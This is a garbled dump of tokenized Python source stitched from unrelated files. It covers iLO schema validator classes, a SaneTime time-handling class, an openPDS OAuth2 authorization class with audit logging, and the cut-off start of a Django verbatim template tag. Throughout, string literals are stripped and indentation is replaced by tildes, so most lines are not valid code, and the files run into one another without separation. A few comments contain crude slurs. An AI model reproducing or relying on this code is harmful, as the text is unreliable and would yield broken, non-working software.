~~~ """Validate that the type is string\n\n        :param attrentry: attribute entry containing data to be validated.\n        :type attrentry: str.\n\n        """ \n 
if in attrentry : \n 
~~~ if isinstance ( attrentry [ ] , list ) : \n 
~~~ for item in attrentry [ ] : \n 
~~~ if item . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif attrentry [ ] == "array" : \n 
~~~ for key , value in attrentry [ ] . iteritems ( ) : \n 
~~~ if key . lower ( ) == "type" and in value : \n 
~~~ return True \n 
~~ ~~ ~~ else : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif in attrentry : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
\n 
~~ ~~ return False \n 
\n 
~~ def validate ( self , newval , name ) : \n 
~~~ """Validate against iLO schema\n\n        :param newval: new value to be used for validation.\n        :type newval: str.\n        :param name: clean name for outputting.\n        :type name: str.\n\n        """ \n 
result = list ( ) \n 
if in self : \n 
~~~ if len ( newval ) < int ( self [ ] ) : \n 
~~~ result . append ( RegistryValidationError ( \n 
u"\'%s\' must be at least \'%s\' characters long" % \n 
( self . Name , int ( self [ ] ) ) , regentry = self ) ) \n 
\n 
~~ ~~ if in self : \n 
~~~ if len ( newval ) > int ( self [ ] ) : \n 
~~~ result . append ( RegistryValidationError ( \n 
u"\'%s\' must be less than \'%s\' characters long" % \n 
( self . Name , int ( self [ ] ) ) , regentry = self ) ) \n 
\n 
~~ ~~ if in self : \n 
~~~ if self [ ] : \n 
~~~ pat = re . compile ( self [ ] ) \n 
if newval and not pat . match ( newval ) : \n 
~~~ result . append ( RegistryValidationError ( \n 
u"\'%(Name)s\' must match the regular expression " \n 
"\'%(ValueExpression)s\'" % ( self ) , regentry = self ) ) \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def print_help ( self , name , out = sys . stdout ) : \n 
~~~ """Info command helper function for print outs\n\n        :param name: clean name for outputting.\n        :type name: str.\n        :param out: output type for verbosity.\n        :type out: output type.\n\n        """ \n 
wrapper = textwrap . TextWrapper ( ) \n 
wrapper . initial_indent = * 4 \n 
wrapper . subsequent_indent = * 4 \n 
\n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % name ) ) \n 
out . write ( ) \n 
\n 
if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
out . write ( ) \n 
\n 
~~ if in self and isinstance ( self [ ] , list ) : \n 
~~~ out . write ( ) \n 
for item in self [ ] : \n 
~~~ out . write ( % wrapper . fill ( % item ) ) \n 
~~ out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
\n 
~~ ~~ ~~ class IntegerValidator ( BaseValidator ) : \n 
~~~ """Interger validator class""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( IntegerValidator , self ) . __init__ ( d ) \n 
\n 
~~ @ staticmethod \n 
def is_type ( attrentry ) : \n 
~~~ """Validate that the type is integer\n\n        :param attrname: attribute name to be used for validation.\n        :type attrname: str.\n\n        """ \n 
if in attrentry : \n 
~~~ if isinstance ( attrentry [ ] , list ) : \n 
~~~ for item in attrentry [ ] : \n 
~~~ if item . lower ( ) == or item . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif attrentry [ ] == "array" : \n 
~~~ for key , value in attrentry [ ] . iteritems ( ) : \n 
~~~ if key . lower ( ) == "type" : \n 
~~~ if value . lower ( ) == or value . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ ~~ else : \n 
~~~ if attrentry [ ] . lower ( ) == or attrentry [ ] . lower ( ) . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif in attrentry : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
\n 
~~ ~~ return False \n 
\n 
~~ def validate ( self , newval , name ) : \n 
~~~ """Validate against iLO schema\n\n        :param newval: new value to be used for validation.\n        :type newval: str.\n        :param name: clean name for outputting.\n        :type name: str.\n\n        """ \n 
result = list ( ) \n 
intval = int ( newval ) \n 
\n 
pat = re . compile ( ) \n 
if newval and not pat . match ( intval ) : \n 
~~~ result . append ( \n 
RegistryValidationError ( \n 
u"\'%(Name)s\' must be an integer value\'" % ( self ) , \n 
regentry = self \n 
) \n 
) \n 
return result \n 
\n 
~~ if in self : \n 
~~~ if intval < int ( self [ ] ) : \n 
~~~ result . append ( RegistryValidationError ( u"\'%s\' must be greater" " than or equal to \'%s\'" % ( self . Name , int ( self [ ] ) ) , regentry = self ) ) \n 
\n 
~~ ~~ if in self : \n 
~~~ if intval > int ( self [ ] ) : \n 
~~~ result . append ( RegistryValidationError ( u"\'%s\' must be less " "than or equal to \'%s\'" % ( self . Name , int ( self [ ] ) ) , regentry = self ) ) \n 
\n 
~~ ~~ return result \n 
\n 
~~ def print_help ( self , name , out = sys . stdout ) : \n 
~~~ """Info command helper function for print outs\n\n        :param name: clean name for outputting.\n        :type name: str.\n        :param out: output type for verbosity.\n        :type out: output type.\n\n        """ \n 
wrapper = textwrap . TextWrapper ( ) \n 
wrapper . initial_indent = * 4 \n 
wrapper . subsequent_indent = * 4 \n 
\n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % name ) ) \n 
out . write ( ) \n 
\n 
if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
out . write ( ) \n 
\n 
~~ if in self and isinstance ( self [ ] , list ) : \n 
~~~ out . write ( ) \n 
for item in self [ ] : \n 
~~~ out . write ( % wrapper . fill ( % item ) ) \n 
~~ out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
\n 
~~ ~~ ~~ class ObjectValidator ( BaseValidator ) : \n 
~~~ """Object validator class""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( ObjectValidator , self ) . __init__ ( d ) \n 
\n 
~~ @ staticmethod \n 
def is_type ( attrentry ) : \n 
~~~ """Validate that the type is object\n\n        :param attrname: attribute name to be used for validation.\n        :type attrname: str.\n\n        """ \n 
if in attrentry : \n 
~~~ if isinstance ( attrentry [ ] , list ) : \n 
~~~ for item in attrentry [ ] : \n 
~~~ if item . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif attrentry [ ] == "array" : \n 
~~~ for key , value in attrentry [ ] . iteritems ( ) : \n 
~~~ if key . lower ( ) == "type" and value . lower ( ) == : \n 
~~~ return True \n 
~~ elif key . lower ( ) == "anyof" : \n 
~~~ try : \n 
~~~ if value [ 0 ] [ ] == : \n 
~~~ return True \n 
~~ ~~ except Exception : \n 
~~~ continue \n 
~~ ~~ ~~ ~~ else : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif in attrentry : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
\n 
~~ ~~ return False \n 
\n 
~~ def validate ( self , newval , name ) : \n 
~~~ """Validate against iLO schema\n\n        :param newval: new value to be used for validation.\n        :type newval: str.\n        :param name: clean name for outputting.\n        :type name: str.\n\n        """ \n 
#TODO need to add so logic for objects class? \n 
result = list ( ) \n 
return result \n 
\n 
~~ def print_help ( self , name , out = sys . stdout ) : \n 
~~~ """Info command helper function for print outs\n\n        :param name: clean name for outputting.\n        :type name: str.\n        :param out: output type for verbosity.\n        :type out: output type.\n\n        """ \n 
wrapper = textwrap . TextWrapper ( ) \n 
wrapper . initial_indent = * 4 \n 
wrapper . subsequent_indent = * 4 \n 
\n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % name ) ) \n 
out . write ( ) \n 
\n 
if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
out . write ( ) \n 
\n 
~~ if in self and isinstance ( self [ ] , list ) : \n 
~~~ out . write ( ) \n 
for item in self [ ] : \n 
~~~ out . write ( % wrapper . fill ( % item ) ) \n 
~~ out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
\n 
~~ ~~ ~~ class PasswordValidator ( BaseValidator ) : \n 
~~~ """Password validator class""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( PasswordValidator , self ) . __init__ ( d ) \n 
\n 
~~ @ staticmethod \n 
def is_type ( attrentry ) : \n 
~~~ """Validate that the type is password\n\n        :param attrname: attribute name to be used for validation.\n        :type attrname: str.\n\n        """ \n 
if in attrentry : \n 
~~~ if isinstance ( attrentry [ ] , list ) : \n 
~~~ for item in attrentry [ ] : \n 
~~~ if item . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif attrentry [ ] == "array" : \n 
~~~ for key , value in attrentry [ ] . iteritems ( ) : \n 
~~~ if key . lower ( ) == "type" and value . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ else : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif in attrentry : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
\n 
~~ ~~ return False \n 
\n 
~~ def validate ( self , newval , name ) : \n 
~~~ """Validate against iLO schema\n\n        :param newval: new value to be used for validation.\n        :type newval: str.\n        :param name: clean name for outputting.\n        :type name: str.\n\n        """ \n 
result = list ( ) \n 
\n 
if newval is None : \n 
~~~ return result \n 
\n 
~~ if in self : \n 
~~~ if len ( newval ) < int ( self [ ] ) : \n 
~~~ result . append ( RegistryValidationError ( u"\'%s\' must be at least" " \'%s\' characters long" % ( self . Name , int ( self [ ] ) ) , regentry = self ) ) \n 
\n 
~~ ~~ if in self : \n 
~~~ if len ( newval ) > int ( self [ ] ) : \n 
~~~ result . append ( RegistryValidationError ( u"\'%s\' must be less " "than \'%s\' characters long" % ( self . Name , int ( self [ ] ) ) , regentry = self ) ) \n 
\n 
~~ ~~ if in self : \n 
~~~ if self [ ] : \n 
~~~ pat = re . compile ( self [ ] ) \n 
if newval and not pat . match ( newval ) : \n 
~~~ result . append ( RegistryValidationError ( u"\'%(Name)s\' must " "match the regular expression \'%(Value" "Expression)s\'" % ( self ) , regentry = self ) ) \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def print_help ( self , name , out = sys . stdout ) : \n 
~~~ """Info command helper function for print outs\n\n        :param name: clean name for outputting.\n        :type name: str.\n        :param out: output type for verbosity.\n        :type out: output type.\n\n        """ \n 
wrapper = textwrap . TextWrapper ( ) \n 
wrapper . initial_indent = * 4 \n 
wrapper . subsequent_indent = * 4 \n 
\n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % name ) ) \n 
out . write ( ) \n 
\n 
if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
out . write ( ) \n 
\n 
~~ if in self and isinstance ( self [ ] , list ) : \n 
~~~ out . write ( ) \n 
for item in self [ ] : \n 
~~~ out . write ( % wrapper . fill ( % item ) ) \n 
~~ out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ ~~ ~~ from . constants import MILLI_MICROS , SECOND_MICROS , MINUTE_MICROS \n 
import calendar \n 
from datetime import datetime \n 
from dateutil import parser \n 
from dateutil . tz import tzlocal \n 
from . error import TimeConstructionError \n 
from . sanedelta import SaneDelta \n 
import pytz \n 
\n 
\n 
#TODO: ensure that this is immutable, and that addiiton,etc always producesa  new object!!! \n 
\n 
MICROS_TRANSLATIONS = ( \n 
( ( , , , , ) , MINUTE_MICROS ) , \n 
( ( , , , , ) , SECOND_MICROS ) , \n 
( ( , , , , ) , MILLI_MICROS ) , \n 
( ( , , , , ) , 1 ) ) \n 
MICROS_TRANSLATION_HASH = dict ( ( alt , v ) for k , v in MICROS_TRANSLATIONS for alt in k ) \n 
\n 
class SaneTime ( object ) : \n 
~~~ """\n    A time stored in epoch microseconds, and optionally decorated with a timezone.\n    An object of this class represents a moment in time.\n    A moment in time experience in America/New_York is equal to the same moment in time experienced in Europe/Dublin\n    """ \n 
\n 
\n 
\n 
"""\n    Why not store in millis or seconds?\n    datetime stores things in micros, and since millis already crosses over the 32bit boundary, we\n    might as well store everything we got in the 64 bit numbers.  This will force 32bit machines to\n    go to long\'s, so maybe a little reduced performance there, but isn\'t everything on 64 bit now?\n    This also avoids the unexpected scenario where two different datetimes would compare as equal\n    when they were converted to sanetimes.  As to why-not-seconds, well that\'s just lame.  You can\n    easily go to seconds or millis from sanetime by using the .s or .ms properties.\n\n    When you do arithmetic with sanetime you are operating on microseconds.  st + 1 creates a new\n    sanetime that is 1 microsecond in the future from the st sanetime.\n\n    When you do comparisons, all comparisons are happening at the microsecond level.  You are\n    comparing microseconds in time.\n    """ \n 
\n 
def __init__ ( self , * args , ** kwargs ) : \n 
~~~ """\n        acceptable arg inputs:\n          1) epoch micros integer (or int like)\n          2) a datetime\n            NOTE!! a naive datetime is assumed to be in UTC, unless you tell this\n            method otherwise by also passing in a tz paramter.  A timezoned datetime is \n            preserved with the timezone it has\n          3) a string representation that the dateutil parser can deal with\n          4) multiple args just as datetime would accept\n\n        acceptable keyworded inputs:\n          1) us = an int/long in epoch micros\n          2) ms = an int/long in epoch millis\n          3) s = an int/long in epoch seconds\n          4) m = an int/long in epoch minutes\n          5) tz = a timezone (either a pytz timezone object, a recognizeable pytz timezone string, or a dateutil tz object)\n        """ \n 
super ( time , self ) . __init__ ( ) \n 
uss = set ( ) \n 
tzs = set ( ) \n 
naive_dt = None \n 
avoid_localize = False \n 
\n 
for k , v in kwargs . iteritems ( ) : \n 
~~~ if k in ( , ) : \n 
~~~ tzs . add ( SaneTime . to_timezone ( v ) ) \n 
~~ elif k in MICROS_TRANSLATION_HASH : \n 
~~~ uss . add ( MICROS_TRANSLATION_HASH [ k ] * v ) \n 
~~ else : \n 
~~~ raise TimeConstructionError ( "Unexpected kwarg in SaneTime constructor! (%s = %s)" % ( k , v ) ) \n 
\n 
~~ ~~ args = list ( args ) \n 
if len ( args ) > 2 and len ( args ) <= 8 : \n 
~~~ args = [ datetime ( * args ) ] \n 
~~ if len ( args ) == 2 : \n 
~~~ tzs . add ( SaneTime . to_timezone ( args . pop ( ) ) ) \n 
~~ if len ( args ) == 1 : \n 
#            import pdb; pdb.set_trace() \n 
~~~ arg = args . pop ( ) \n 
if hasattr ( arg , ) : \n 
~~~ uss . add ( int ( arg ) ) \n 
if hasattr ( arg , ) : tzs . add ( arg . tz ) \n 
~~ elif isinstance ( arg , basestring ) : \n 
~~~ parts = arg . strip ( ) . split ( ) \n 
if len ( parts ) > 1 and parts [ - 1 ] . startswith ( ) : \n 
~~~ try : \n 
~~~ tzs . add ( SaneTime . to_timezone ( parts [ - 1 ] [ 1 : ] ) ) \n 
arg = . join ( parts [ : - 1 ] ) \n 
~~ except : pass \n 
~~ utc = arg . endswith ( ) or arg . endswith ( ) \n 
arg = parser . parse ( arg ) \n 
if arg . tzinfo : # parsed timezones are a special breed of retard \n 
~~~ if utc : \n 
~~~ tzs . add ( pytz . utc ) \n 
arg = arg . replace ( tzinfo = None ) \n 
~~ elif isinstance ( arg . tzinfo , tzlocal ) : # in case the parser decides to use tzlocal instead of a tzoffset \n 
~~~ arg = arg . replace ( tzinfo = None ) \n 
~~ else : \n 
\n 
~~~ avoid_localize = True \n 
arg = arg . astimezone ( pytz . utc ) . replace ( tzinfo = None ) \n 
~~ ~~ ~~ if type ( arg ) == datetime : \n 
~~~ naive_dt = arg \n 
if naive_dt . tzinfo : \n 
~~~ tzs . add ( SaneTime . to_timezone ( str ( naive_dt . tzinfo ) ) ) \n 
naive_dt = naive_dt . replace ( tzinfo = None ) \n 
\n 
~~ ~~ ~~ if len ( tzs ) > 1 : \n 
~~~ raise TimeConstructionError ( "constructor arguments seem to specify more than one different timezone!  I can\'t possibly resolve that!  (timezones implied = %s)" % ( tzs ) ) \n 
\n 
# now we have enough info to figure out the tz: \n 
~~ self . tz = len ( tzs ) and tzs . pop ( ) or pytz . utc \n 
\n 
\n 
if naive_dt : \n 
~~~ if avoid_localize : \n 
~~~ uss . add ( SaneTime . utc_datetime_to_us ( naive_dt ) ) \n 
~~ else : \n 
~~~ uss . add ( SaneTime . utc_datetime_to_us ( self . tz . localize ( naive_dt ) . astimezone ( pytz . utc ) ) ) \n 
\n 
# if we got nothing yet for micros, then make it now \n 
~~ ~~ if len ( uss ) == 0 : \n 
~~~ uss . add ( SaneTime . utc_datetime_to_us ( datetime . utcnow ( ) ) ) \n 
\n 
~~ if len ( uss ) > 1 : \n 
~~~ raise TimeConstructionError ( "constructor arguments seem to specify more than one different time!  I can\'t possibly resolve that!  (micro times implied = %s)" % ( uss ) ) \n 
\n 
~~ self . us = uss . pop ( ) \n 
\n 
if len ( args ) > 0 : \n 
~~~ raise TimeConstructionError ( "Unexpected constructor arguments" ) \n 
\n 
\n 
~~ ~~ @ property \n 
def ms ( self ) : return self . us / MILLI_MICROS \n 
epoch_milliseconds = epoch_millis = milliseconds = millis = ms \n 
@ property \n 
def s ( self ) : return self . us / SECOND_MICROS \n 
epoch_seconds = epoch_secs = seconds = secs = s \n 
@ property \n 
def m ( self ) : return self . us / MINUTE_MICROS \n 
epoch_minutes = epoch_mins = minutes = mins = m \n 
@ property \n 
def micros ( self ) : return self . us \n 
epoch_microseconds = epoch_micros = microseconds = micros \n 
\n 
@ property \n 
def tz_name ( self ) : return self . tz . zone \n 
@ property \n 
def tz_abbr ( self ) : return self . tz . _tzname \n 
\n 
def set_tz ( self , tz ) : \n 
~~~ self . tz = self . __class__ . to_timezone ( tz ) ; return self \n 
~~ def with_tz ( self , tz ) : \n 
~~~ return self . __class__ ( self . us , tz ) \n 
\n 
\n 
~~ @ property \n 
def _tuple ( self ) : return ( self . us , self . tz ) \n 
\n 
def strftime ( self , * args , ** kwargs ) : return self . datetime . strftime ( * args , ** kwargs ) \n 
\n 
def __cmp__ ( self , other ) : \n 
~~~ if not hasattr ( other , ) : other = SaneTime ( other ) \n 
return cmp ( self . us , int ( other ) ) \n 
~~ def __hash__ ( self ) : return self . us . __hash__ ( ) \n 
\n 
def __add__ ( self , operand ) : \n 
~~~ if not hasattr ( operand , ) : operand = SaneTime ( operand ) \n 
return self . __class__ ( self . us + int ( operand ) , tz = self . tz ) \n 
~~ def __sub__ ( self , operand ) : \n 
~~~ if not hasattr ( operand , ) : operand = SaneTime ( operand ) \n 
if isinstance ( operand , SaneTime ) : return SaneDelta ( self . us - int ( operand ) ) \n 
return self . __add__ ( - int ( operand ) ) \n 
~~ def __mul__ ( self , operand ) : \n 
~~~ return self . us * int ( operand ) \n 
~~ def __div__ ( self , operand ) : \n 
~~~ return self . us / int ( operand ) \n 
\n 
~~ def __int__ ( self ) : return int ( self . us ) \n 
def __long__ ( self ) : return long ( self . us ) \n 
\n 
def __repr__ ( self ) : return u"SaneTime(%s,%s)" % ( self . us , repr ( self . tz ) ) \n 
def __str__ ( self ) : return unicode ( self ) . encode ( ) \n 
def __unicode__ ( self ) : \n 
~~~ dt = self . datetime \n 
micros = u".%06d" % dt . microsecond if dt . microsecond else \n 
time = u" %02d:%02d:%02d%s" % ( dt . hour , dt . minute , dt . second , micros ) if dt . microsecond or dt . second or dt . minute or dt . hour else \n 
return u"%04d-%02d-%02d%s +%s" % ( dt . year , dt . month , dt . day , time , dt . tzinfo . zone ) \n 
\n 
~~ def clone ( self ) : \n 
~~~ """ cloning stuff """ \n 
return self . __class__ ( self . us , self . tz ) \n 
\n 
~~ @ property \n 
def ny_str ( self ) : \n 
~~~ """ a ny string """ \n 
return self . ny_ndt . strftime ( ) \n 
\n 
~~ @ property \n 
def utc_datetime ( self ) : return SaneTime . us_to_utc_datetime ( self . us ) \n 
utc_dt = utc_datetime \n 
@ property \n 
def utc_naive_datetime ( self ) : return self . utc_datetime . replace ( tzinfo = None ) \n 
utc_ndt = utc_naive_datetime \n 
\n 
def to_timezoned_datetime ( self , tz ) : return self . utc_datetime . astimezone ( SaneTime . to_timezone ( tz ) ) \n 
def to_timezoned_naive_datetime ( self , tz ) : return self . to_timezoned_datetime ( tz ) . replace ( tzinfo = None ) \n 
\n 
@ property \n 
def datetime ( self ) : return self . to_timezoned_datetime ( self . tz ) \n 
dt = datetime \n 
@ property \n 
def naive_datetime ( self ) : return self . to_timezoned_naive_datetime ( self . tz ) \n 
ndt = naive_datetime \n 
\n 
@ property \n 
def ny_datetime ( self ) : return self . to_timezoned_datetime ( ) \n 
ny_dt = ny_datetime \n 
@ property \n 
def ny_naive_datetime ( self ) : return self . to_timezoned_naive_datetime ( ) \n 
ny_ndt = ny_naive_datetime \n 
\n 
\n 
\n 
@ property \n 
def year ( self ) : return self . dt . year \n 
@ property \n 
def month ( self ) : return self . dt . month \n 
@ property \n 
def day ( self ) : return self . dt . day \n 
@ property \n 
def hour ( self ) : return self . dt . hour \n 
@ property \n 
def minute ( self ) : return self . dt . minute \n 
@ property \n 
def second ( self ) : return self . dt . second \n 
@ property \n 
def microsecond ( self ) : return self . dt . microsecond \n 
\n 
#def add_datepart(self, months=None, years=None, auto_day_adjust=True): \n 
#months = (months or 0) + (years or 0) * 12 \n 
#dt = self.utc_dt \n 
#day = dt.day \n 
#month = dt.month + months%12 \n 
#year = dt.year + months/12 \n 
#if auto_day_adjust: \n 
#if day>=29 and month==2: \n 
#leap_year = year%4==0 and (not year%100==0 or year%400==0) \n 
#day = 29 if leap_year else 28 \n 
#elif day==31 and month in (4,6,9,11): \n 
#day = 30 \n 
#return SaneTime(fucked_datetime(year,month,day,dt.hour,dt.minute,dt.second,dt.microsecond,tz=pytz.utc)) \n 
\n 
@ classmethod \n 
def utc_datetime_to_us ( kls , dt ) : \n 
~~~ return calendar . timegm ( dt . timetuple ( ) ) * 1000 ** 2 + dt . microsecond \n 
\n 
~~ @ classmethod \n 
def us_to_utc_datetime ( kls , us ) : \n 
~~~ return pytz . utc . localize ( datetime . utcfromtimestamp ( us / 10 ** 6 ) ) . replace ( microsecond = us % 10 ** 6 ) \n 
\n 
~~ @ classmethod \n 
def to_timezone ( kls , tz ) : \n 
~~~ if not isinstance ( tz , basestring ) : return tz \n 
return pytz . timezone ( tz ) \n 
\n 
\n 
# null passthru utility \n 
~~ ~~ def ntime ( * args , ** kwargs ) : \n 
~~~ if args : \n 
~~~ if args [ 0 ] is None : return None \n 
~~ elif kwargs : \n 
~~~ if None in [ v for k , v in kwargs . iteritems ( ) if k != ] : return None \n 
~~ return SaneTime ( * args , ** kwargs ) \n 
\n 
#primary aliases \n 
~~ time = sanetime = SaneTime \n 
nsanetime = ntime \n 
\n 
from tastypie . authorization import Authorization \n 
from openpds . authentication import OAuth2Authentication \n 
from openpds . core . models import Profile , AuditEntry \n 
\n 
import settings \n 
import pdb \n 
import traceback \n 
\n 
class PDSAuthorization ( Authorization ) : \n 
~~~ audit_enabled = True \n 
scope = "" \n 
requester_uuid = "" \n 
\n 
def requester ( self ) : \n 
#        print self.requester_uuid \n 
~~~ return self . requester_uuid \n 
\n 
~~ def trustWrapper ( self , datastore_owner ) : \n 
~~~ print "checking trust wrapper" \n 
#ds_owner_profile = Profile.objects.get(uuid = datastore_owner_uuid) \n 
#print datastore_owner.sharinglevel_owner.get(isselected = True) \n 
\n 
~~ def is_authorized ( self , request , object = None ) : \n 
#        pdb.set_trace() \n 
~~~ authenticator = OAuth2Authentication ( self . scope ) \n 
if "datastore_owner__uuid" in request . REQUEST : \n 
~~~ authorized = True \n 
token = request . REQUEST [ "bearer_token" ] if "bearer_token" in request . REQUEST else request . META [ "HTTP_BEARER_TOKEN" ] \n 
# Result will be the uuid of the requesting party \n 
\n 
# Note: the trustwrapper must be run regardless of if auditting is enabled on this call or not \n 
\n 
datastore_owner_uuid = request . REQUEST [ "datastore_owner__uuid" ] \n 
datastore_owner , ds_owner_created = Profile . objects . get_or_create ( uuid = datastore_owner_uuid ) \n 
self . requester_uuid = authenticator . get_userinfo_from_token ( token , self . scope ) \n 
\n 
if self . requester_uuid is False or self . requester_uuid is None or len ( self . requester_uuid ) == 0 : \n 
~~~ self . requester_uuid = "not-specified" \n 
authorized = False \n 
\n 
~~ self . trustWrapper ( datastore_owner ) \n 
\n 
try : \n 
~~~ if ( self . audit_enabled ) : \n 
#pdb.set_trace() \n 
~~~ audit_entry = AuditEntry ( token = token ) \n 
audit_entry . method = request . method \n 
audit_entry . scope = self . scope \n 
audit_entry . purpose = request . REQUEST [ "purpose" ] if "purpose" in request . REQUEST else "" \n 
audit_entry . system_entity_toggle = request . REQUEST [ "system_entity" ] if "system_entity" in request . REQUEST else False \n 
# NOTE: datastore_owner and requester are required \n 
\n 
audit_entry . datastore_owner = datastore_owner \n 
audit_entry . requester , created = Profile . objects . get_or_create ( uuid = self . requester_uuid ) \n 
audit_entry . script = request . path \n 
audit_entry . save ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print e \n 
authorized = False \n 
\n 
~~ return authorized \n 
\n 
~~ return False \n 
\n 
~~ def __init__ ( self , scope , audit_enabled = True ) : \n 
#pdb.set_trace() \n 
~~~ self . scope = scope \n 
self . audit_enabled = audit_enabled \n 
\n 
# Optional but useful for advanced limiting, such as per user. \n 
# def apply_limits(self, request, object_list): \n 
\n 
#        return object_list.filter(author__username=request.user.username) \n 
# \n 
#    return object_list.none() \n 
\n 
~~ ~~ """\nFrom ericflo (https://gist.github.com/629508)\n\njQuery templates use constructs like:\n\n    {{if condition}} print something{{/if}}\n\nThis, of course, completely screws up Django templates,\nbecause Django thinks {{ and }} mean something.\n\nWrap {% verbatim %} and {% endverbatim %} around those\nblocks of jQuery templates and this will try its best\nto output the contents with no changes.\n""" \n 
\n 
from django import template \n 
\n 
register = template . Library ( ) \n 
\n 
\n 
class VerbatimNode ( template . Node ) : \n 
\n 
~~~ def __init__ ( self , text ) : \n 
~~~ self . text = text \n 
\n 
